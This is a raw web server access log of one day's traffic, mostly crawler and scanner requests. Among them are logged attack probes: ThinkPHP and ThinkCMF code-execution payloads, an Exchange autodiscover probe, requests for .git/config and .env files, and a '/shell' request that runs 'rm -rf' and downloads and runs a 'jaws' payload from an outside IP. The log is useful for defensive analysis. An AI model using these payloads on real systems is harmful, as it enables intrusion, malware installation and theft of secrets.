3.138.111.203 - - [19/May/2023:10:08:33 -0400] "GET /.well-known/acme-challenge/KF72B58eF_rmJlr-ANpis7vctHKtKuYahVLat0VI454 HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.143.252.44 - - [24/May/2023:08:00:03 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /global/sign.js HTTP/1.1" 200 6392 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /global/config.js HTTP/1.1" 200 404 "-" "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /global/filter.js HTTP/1.1" 200 3903 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /js/plugins/jquery-3.6.0.min.js HTTP/1.1" 404 196 "-" "Roku/DVP-4.1 (024.01E01250A)"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /global/dialog.js HTTP/1.1" 200 7476 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /js/main.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /js/plugins/jquery.slick.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /global/functions.js HTTP/1.1" 200 12046 "-" "Mozilla/5.0 (Linux; Android 8.0.0; LG-H932) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:14 -0400] "GET /js/plugins/isotope.pkg.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3890.0 Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET //xumm.app/assets/cdn/xumm-oauth2-pkce.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /global/filter.js HTTP/1.1" 200 3903 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /global/config.js HTTP/1.1" 200 404 "-" "Mozilla/5.0 (Linux; U; Android 8.1.0; es-us; Redmi Note 5 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.9.7-g"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET //cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/WIFI Language/zh_CN"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /global/dialog.js HTTP/1.1" 200 7476 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.102 Safari/537.36 Vivaldi/2.6.1566.44"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /js/plugins/jquery.slick.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; Alcatel_5044R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /global/sign.js HTTP/1.1" 200 6392 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3844.0 Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /js/main.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3800.0 Iron Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /js/plugins/jquery-3.6.0.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /global/functions.js HTTP/1.1" 200 12046 "-" "Mozilla/5.0 (Linux; Android 8.0.0; Lenovo K8 Note) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
3.143.252.44 - - [24/May/2023:08:00:15 -0400] "GET /js/plugins/isotope.pkg.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL Build/OPR6.170623.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36"
45.95.169.184 - - [24/May/2023:08:18:10 -0400] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 404 196 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
45.85.190.64 - - [24/May/2023:08:18:57 -0400] "GET / HTTP/1.1" 200 53859 "-" "Java/1.8.0_212"
45.85.190.64 - - [24/May/2023:08:18:57 -0400] "GET /api.json HTTP/1.1" 404 196 "-" "Java/1.8.0_212"
5.34.182.181 - - [24/May/2023:09:09:20 -0400] "\x16\x03\x03" 400 226 "-" "-"
45.79.168.172 - - [24/May/2023:09:31:53 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
45.79.181.94 - - [24/May/2023:09:34:06 -0400] "\x16\x03\x01" 400 226 "-" "-"
192.241.206.81 - - [24/May/2023:09:37:43 -0400] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
192.155.88.231 - - [24/May/2023:10:18:29 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 zgrab/0.x"
103.178.228.41 - - [24/May/2023:10:24:48 -0400] "GET / HTTP/1.1" 200 53859 "-" "Linux Gnu (cow)"
192.241.206.20 - - [24/May/2023:10:31:59 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 zgrab/0.x"
192.241.206.21 - - [24/May/2023:10:33:16 -0400] "GET /version HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
107.170.234.9 - - [24/May/2023:10:33:27 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
193.32.162.190 - - [24/May/2023:10:41:56 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
80.94.92.75 - - [24/May/2023:10:42:21 -0400] "CONNECT google.com:443 HTTP/1.1" 200 53859 "-" "Go-http-client/1.1"
80.94.92.75 - - [24/May/2023:10:42:22 -0400] "\x16\x03\x01" 400 226 "-" "-"
172.104.242.173 - - [24/May/2023:10:52:55 -0400] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<\xe0\x13\xcf" 400 226 "-" "-"
83.97.73.89 - - [24/May/2023:11:16:28 -0400] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.89 - - [24/May/2023:11:28:47 -0400] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.248.133.191 - - [24/May/2023:12:13:13 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.191 - - [24/May/2023:12:13:13 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
208.100.26.235 - - [24/May/2023:12:37:29 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Mobile/14E304 Safari/602.1"
208.100.26.235 - - [24/May/2023:12:37:29 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Android 7.0; Mobile; rv:65.0) Gecko/65.0 Firefox/65.0"
83.97.73.89 - - [24/May/2023:12:44:30 -0400] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.227.28 - - [24/May/2023:12:53:38 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 zgrab/0.x"
192.241.225.62 - - [24/May/2023:13:03:57 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
47.100.53.105 - - [24/May/2023:13:34:16 -0400] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 100.43.163.61/jaws;sh+/tmp/jaws" 400 226 "-" "-"
159.223.57.114 - - [24/May/2023:14:41:30 -0400] "\x16\x03\x01" 400 226 "-" "-"
159.223.57.114 - - [24/May/2023:14:41:30 -0400] "\x16\x03\x01" 400 226 "-" "-"
159.223.57.114 - - [24/May/2023:14:41:31 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.57.114 - - [24/May/2023:14:41:32 -0400] "GET /client/get_targets HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.57.114 - - [24/May/2023:14:41:32 -0400] "GET /upl.php HTTP/1.1" 404 16 "-" "Mozilla/5.0"
159.223.57.114 - - [24/May/2023:14:41:32 -0400] "\x16\x03\x01" 400 226 "-" "-"
159.223.57.114 - - [24/May/2023:14:41:33 -0400] "GET /geoip/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.57.114 - - [24/May/2023:14:41:33 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
159.223.57.114 - - [24/May/2023:14:41:34 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.57.114 - - [24/May/2023:14:41:35 -0400] "GET /1.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.57.114 - - [24/May/2023:14:41:35 -0400] "GET /bundle.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
107.150.97.144 - - [24/May/2023:14:45:19 -0400] "GET / HTTP/1.1" 200 53859 "-" "-"
5.188.210.227 - - [24/May/2023:15:02:51 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
34.222.88.26 - - [24/May/2023:15:09:47 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "python-requests/2.25.1"
147.78.103.181 - - [24/May/2023:15:47:21 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:23 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:23 -0400] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:24 -0400] "GET /xmlrpc.php?rsd HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:24 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:40 -0400] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:40 -0400] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:41 -0400] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:41 -0400] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:42 -0400] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:43 -0400] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:44 -0400] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:45 -0400] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:45 -0400] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:45 -0400] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:46 -0400] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:46 -0400] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:47 -0400] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:47 -0400] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:48 -0400] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.78.103.181 - - [24/May/2023:15:47:48 -0400] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.188.210.227 - - [24/May/2023:16:18:10 -0400] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 16 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
205.210.31.39 - - [24/May/2023:16:33:00 -0400] "GET / HTTP/1.0" 301 238 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.199.97.37 - - [24/May/2023:16:52:16 -0400] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
35.216.229.26 - - [24/May/2023:16:59:28 -0400] "\x16\x03\x01" 400 226 "-" "-"
35.216.229.26 - - [24/May/2023:16:59:28 -0400] "GET / HTTP/1.1" 400 226 "-" "-"
35.216.229.26 - - [24/May/2023:16:59:29 -0400] "GET / HTTP/1.1" 200 53859 "-" "l9tcpid/v1.1.0"
35.216.229.26 - - [24/May/2023:16:59:29 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.229.26 - - [24/May/2023:16:59:29 -0400] "GET /server-status HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.229.26 - - [24/May/2023:16:59:30 -0400] "GET /config.json HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.229.26 - - [24/May/2023:16:59:30 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.229.26 - - [24/May/2023:16:59:30 -0400] "GET /telescope/requests HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.229.26 - - [24/May/2023:16:59:30 -0400] "GET /info.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
36.225.124.185 - - [24/May/2023:17:23:32 -0400] "POST / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
193.35.18.35 - - [24/May/2023:17:56:17 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36"
35.195.93.98 - - [24/May/2023:18:18:55 -0400] "GET / HTTP/1.1" 200 53859 "-" "python-requests/2.28.2"
35.203.210.26 - - [24/May/2023:18:58:55 -0400] "GET / HTTP/1.1" 200 53859 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
205.210.31.78 - - [24/May/2023:19:06:45 -0400] "\x16\x03\x01" 400 226 "-" "-"
103.29.68.158 - - [24/May/2023:19:07:25 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.29.68.158 - - [24/May/2023:19:07:27 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.140.148.74 - - [24/May/2023:19:14:30 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
104.140.148.78 - - [24/May/2023:19:21:03 -0400] "\x16\x03\x01" 400 226 "-" "-"
162.216.150.125 - - [24/May/2023:19:34:32 -0400] "GET / HTTP/1.1" 200 53859 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
43.156.25.237 - - [24/May/2023:19:48:07 -0400] "-" 408 - "-" "-"
43.156.25.237 - - [24/May/2023:19:48:17 -0400] "\xff\xa2\xff" 400 226 "-" "-"
43.156.25.237 - - [24/May/2023:19:48:18 -0400] "o\xfa\xc0\xbe\xb8\xc0\xa4\xc9\x89\xa2\xc2\x8f\x83\xaf\x91\x97\xbe\xcd\xb9\xcf\xac\x9b\xb0\xab\xa0\xb6\xb1\xaa\x9d\x9c\x9f\x96\x8d\x93\xce\xb4\xb3\xb5\x98\xcd\xa6\xfa\xfa\xfa\xfa\x12\xfd\xd8\xf8\xfa\xfa\xc2\xfa\xfa\xfa\xfa\x1af\xec\xf9\xfa\xfa\xfa\xfa\xfb\xe5q\xf2\xfa\xfa\xfa\xfa\xfa\xfa\xf9wh\x97ui\xba\xea=E\xf0\x1b/\xa7XJ\xf11Y\v\xbf\xb1K\x1f" 400 226 "-" "-"
193.47.61.47 - - [24/May/2023:19:54:23 -0400] "GET / HTTP/1.1" 200 53859 "-" "Go-http-client/1.1"
104.140.148.70 - - [24/May/2023:20:41:14 -0400] "GET /supp/notifications.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.56 Safari/537.36"
104.140.148.70 - - [24/May/2023:21:00:13 -0400] "GET /server-status HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8"
45.95.169.184 - - [24/May/2023:21:03:17 -0400] "POST /index.htm HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
45.95.169.184 - - [24/May/2023:21:03:17 -0400] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 404 196 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
103.187.191.158 - - [24/May/2023:21:39:00 -0400] "GET / HTTP/1.0" 200 56985 "-" "-"
103.187.191.158 - - [24/May/2023:21:39:01 -0400] "POST /sdk HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
103.187.191.158 - - [24/May/2023:21:39:01 -0400] "GET /nmaplowercheck1684978740 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
103.187.191.158 - - [24/May/2023:21:39:02 -0400] "GET /evox/about HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
103.187.191.158 - - [24/May/2023:21:39:02 -0400] "GET /HNAP1 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
103.187.191.158 - - [24/May/2023:21:39:03 -0400] "GET / HTTP/1.0" 200 56985 "-" "-"
103.187.191.158 - - [24/May/2023:21:39:04 -0400] "GET / HTTP/1.1" 200 53859 "-" "-"
172.105.128.11 - - [24/May/2023:22:00:10 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.251 - - [24/May/2023:22:07:33 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
36.225.124.185 - - [24/May/2023:22:08:43 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
194.180.48.85 - - [24/May/2023:22:13:03 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
